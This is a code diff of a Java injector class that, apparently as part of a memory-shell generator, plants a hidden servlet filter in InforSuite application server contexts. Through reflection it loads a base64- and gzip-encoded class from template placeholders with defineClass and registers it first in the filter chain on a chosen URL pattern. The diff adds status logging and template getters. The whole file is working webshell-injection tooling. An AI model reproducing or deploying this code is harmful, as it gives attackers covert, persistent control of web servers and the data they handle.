@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.inforsuite;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
@@ -11,16 +12,23 @@ import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class InforSuiteFilterInjector {
 
- 
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static String urlPattern;
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public InforSuiteFilterInjector() {
         if (ok) {
@@ -30,27 +38,42 @@ public class InforSuiteFilterInjector {
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-          
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
-                   
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-              
+                    msg += "[" + getUrlPattern() + "] ready\n";
                 } catch (Throwable e) {
-                   
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
-   
+        System.out.println(msg);
     }
 
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
 
     /**
      * com.cvicse.loong.enterprise.web.WebModule
@@ -80,26 +103,26 @@ public class InforSuiteFilterInjector {
         }
     }
 
-   
+    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-      
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
-        String filterName = shellClassName;
-        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
+        String filterName = getClassName();
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             return;
         }
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
@@ -110,7 +133,7 @@ public class InforSuiteFilterInjector {
         invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
-        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
+        invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
 
         // addFilterMapFirst
         try {
@@ -139,9 +162,13 @@ public class InforSuiteFilterInjector {
         }
         filterConfigs.put(filterName, filterConfig);
     }
-    
 
-   
+    @Override
+    public String toString() {
+        return msg;
+    }
+
+    @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
         Class<?> decoderClass;
         try {
@@ -154,7 +181,7 @@ public class InforSuiteFilterInjector {
         }
     }
 
-   
+    @SuppressWarnings("all")
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
@@ -174,7 +201,7 @@ public class InforSuiteFilterInjector {
         }
     }
 
-   
+    @SuppressWarnings("all")
     public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
         for (Class<?> clazz = obj.getClass();
              clazz != Object.class;
@@ -189,7 +216,7 @@ public class InforSuiteFilterInjector {
     }
 
 
-
+@SuppressWarnings("all")
 public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
     Field field = getField(obj, name);
         field.setAccessible(true);
@@ -203,7 +230,7 @@ public static void setFieldValue(final Object obj, final String fieldName, final
     field.set(obj, value);
     }
 
-   
+    @SuppressWarnings("all")
     public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
         Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
         Method method = null;
@@ -225,5 +252,18 @@ public static void setFieldValue(final Object obj, final String fieldName, final
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
-
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
